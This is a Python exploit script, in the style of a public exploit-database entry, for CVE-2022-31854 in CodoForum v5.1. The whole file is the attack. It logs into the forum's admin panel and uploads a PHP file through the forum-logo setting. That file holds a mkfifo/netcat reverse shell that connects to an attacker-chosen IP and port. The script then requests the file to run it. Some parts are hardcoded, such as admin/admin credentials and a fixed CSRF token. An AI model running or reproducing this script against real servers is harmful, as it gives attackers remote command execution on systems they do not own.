# Exploit Title: CodoForum v5.1 - Remote Code Execution (RCE)
# Date: 06/07/2022
# Exploit Author: Krish Pandey (@vikaran101)
# Vendor Homepage: https://codoforum.com/
# Software Link: https://bitbucket.org/evnix/codoforum_downloads/downloads/codoforum.v.5.1.zip
# Version: CodoForum v5.1
# Tested on: Ubuntu 20.04
# CVE: CVE-2022-31854

#!/usr/bin/python3

import requests
import time
import optparse
import random
import string

banner = """
  ______     _______     ____   ___ ____  ____      _____ _  ___ ____  _  _
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ // |( _ ) ___|| || |
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \| |/ _ \___ \| || |_
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) | | (_) |__) |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/|_|\___/____/   |_|
"""

print("\nCODOFORUM V5.1 ARBITRARY FILE UPLOAD TO RCE(Authenticated)")
print(banner)
print("\nExploit found and written by: @vikaran101\n")

parser = optparse.OptionParser()
parser.add_option('-t', '--target-url', action="store", dest='target', help='path of the CodoForum v5.1 install')
parser.add_option('-u', '--username', action="store", dest='username', help='admin username')
parser.add_option('-p', '--password', action="store", dest='password', help='admin password')
parser.add_option('-i', '--listener-ip', action="store", dest='ip', help='listener address')
parser.add_option('-n', '--port', action="store", dest='port', help='listener port number')

options, args = parser.parse_args()

proxy = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

if not options.target or not options.username or not options.password or not options.ip or not options.port:
    print("[-] Missing arguments!")
    print("[*] Example usage: ./exploit.py -t [target url] -u [username] -p [password] -i [listener ip] -n [listener port]")
    print("[*] Help menu: ./exploit.py -h OR ./exploit.py --help")
    exit()

loginURL = options.target + '/admin/?page=login'
globalSettings = options.target + '/admin/index.php?page=config'
payloadURL = options.target + '/sites/default/assets/img/attachments/'

session = requests.Session()

randomFileName = ''.join((random.choice(string.ascii_lowercase) for x in range(10)))

def getPHPSESSID():

    try:
        get_PHPID = session.get(loginURL)
        headerDict = get_PHPID.headers
        cookies = headerDict['Set-Cookie'].split(';')[0].split('=')[1]
        return cookies
    except:
        exit()

phpID = getPHPSESSID()

def login():
    send_cookies = {'cf':'0'}
    send_headers = {'Host': loginURL.split('/')[2], 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate','Content-Type':'multipart/form-data; boundary=---------------------------2838079316671520531167093219','Content-Length':'295','Origin':loginURL.split('/')[2],'Connection':'close','Referer':loginURL,'Upgrade-Insecure-Requests':'1'}
    send_creds = "-----------------------------2838079316671520531167093219\nContent-Disposition: form-data; name=\"username\"\n\nadmin\n-----------------------------2838079316671520531167093219\nContent-Disposition: form-data; name=\"password\"\n\nadmin\n-----------------------------2838079316671520531167093219--"
    auth = session.post(loginURL, headers=send_headers, cookies=send_cookies, data=send_creds, proxies=proxy)

    if "CODOFORUM | Dashboard" in auth.text:
        print("[+] Login successful")

def uploadAndExploit():
    send_cookies = {'cf':'0', 'user_id':'1', 'PHPSESSID':phpID}
    send_headers = {'Content-Type':'multipart/form-data; boundary=---------------------------7450086019562444223451102689'}
    send_payload = '\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="site_title"\n\nCODOLOGIC\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="site_description"\n\ncodoforum - Enhancing your forum experience with next generation technology!\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="admin_email"\n\nadmin@codologic.com\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="default_timezone"\n\nEurope/London\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="register_pass_min"\n\n8\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="num_posts_all_topics"\n\n30\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="num_posts_cat_topics"\n\n20\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="num_posts_per_topic"\n\n20\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_attachments_path"\n\nassets/img/attachments\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_attachments_exts"\n\njpg,jpeg,png,gif,pjpeg,bmp,txt\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_attachments_size"\n\n3\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_attachments_mimetypes"\n\nimage/*,text/plain\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_tags_num"\n\n5\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_tags_len"\n\n15\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="reply_min_chars"\n\n10\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="insert_oembed_videos"\n\nyes\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_privacy"\n\neveryone\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="approval_notify_mails"\n\n\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_header_menu"\n\nsite_title\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="forum_logo"; filename="' + randomFileName + '.php"\nContent-Type: application/x-php\n\n<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ' + options.ip + ' ' + options.port + ' >/tmp/f");?> \n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="login_by"\n\nUSERNAME\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="force_https"\n\nno\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="user_redirect_after_login"\n\ntopics\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="sidebar_hide_topic_messages"\n\noff\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="sidebar_infinite_scrolling"\n\non\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="show_sticky_topics_without_permission"\n\nno\n-----------------------------7450086019562444223451102689\nContent-Disposition: form-data; name="CSRF_token"\n\n23cc3019cadb6891ebd896ae9bde3d95\n-----------------------------7450086019562444223451102689--\n'
    exploit = requests.post(globalSettings, headers=send_headers, cookies=send_cookies, data=send_payload, proxies=proxy)

    print("[*] Checking webshell status and executing...")
    payloadExec = session.get(payloadURL + randomFileName + '.php', proxies=proxy)
    if payloadExec.status_code == 200:
        print("[+] Payload uploaded successfully and executed, check listener")
    else:
        print("[-] Something went wrong, please try uploading the shell manually(admin panel > global settings > change forum logo > upload and access from " + payloadURL +"[file.php])")
login()
uploadAndExploit()